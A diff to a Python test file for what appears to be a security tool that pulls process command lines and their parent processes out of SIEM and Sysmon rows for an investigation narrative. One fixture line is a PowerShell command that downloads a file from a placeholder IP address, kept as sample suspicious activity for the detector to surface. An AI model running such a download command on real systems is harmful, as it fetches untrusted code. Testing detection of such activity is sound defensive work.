@@ -80,13 +80,30 @@ def test_plain_interpreter_command_lines_reach_the_narrative():
     first = "\n".join(_as_record(DomainFinding(domain="endpoint", narrative="n"), slice_).facts)
     block = first.split(COMMANDS_FOOTER + "\n")[1].split(ADDRESSES_FOOTER)[0].splitlines()
 
-    assert block == [f"~ 1 events: {download}"]
+    assert block == [f"~ 1 row contributions; command: {download}"]
 
 
 def test_a_raw_sysmon_row_gives_its_command_line_from_the_xml():
     # 148b0e69's T4 searched by hash and tabled `_raw`: the download sat in the XML.
     raw = "<Data Name='CommandLine'>powershell.exe -C Test-Connection 10.0.10.1</Data>"
-    assert commands_in([{"_raw": raw}]) == {"powershell.exe -C Test-Connection 10.0.10.1": 1}
+    assert commands_in([{"_raw": raw}]) == {"powershell.exe -C Test-Connection 10.0.10.1": {"events": 1, "parents": {}}}
+
+
+def test_every_command_line_crosses_with_its_parent_and_row_contributions():
+    # d6b48ef0: the download repeated 16x, so "rarest first" under an 8-line cap put
+    # it last, and the packer cut it. The parent is the link the narrative lost.
+    parent = r"C:\Users\user\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
+    download = "powershell.exe -C iwr http://10.0.0.1/a -OutFile x"
+    rows = [{"CommandLine": f"powershell.exe -C Get-Process {i}", "ParentImage": parent, "count": "1"} for i in range(9)]
+    rows.append({"CommandLine": download, "ParentImage": parent, "count": "16"})
+    assert commands_in(rows)[download] == {"events": 16, "parents": {parent: 16}}
+
+    slice_ = DomainSlice(domain="endpoint", siem_sets=[("processes", ResultSet(query="q", row_count=10, rows=rows))])
+    lines = [f for f in _as_record(DomainFinding(domain="endpoint", narrative="n"), slice_).facts if "; command: " in f]
+
+    assert len(lines) == 10  # no 8-line cap: the packer decides what fits
+    assert lines[-1].startswith("~ 16 row contributions, parent C:\\Users\\")
+    assert lines[-1].endswith(f"; command: {download}")
 
 
 ONEDRIVE = r"C:\Users\Mariam\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
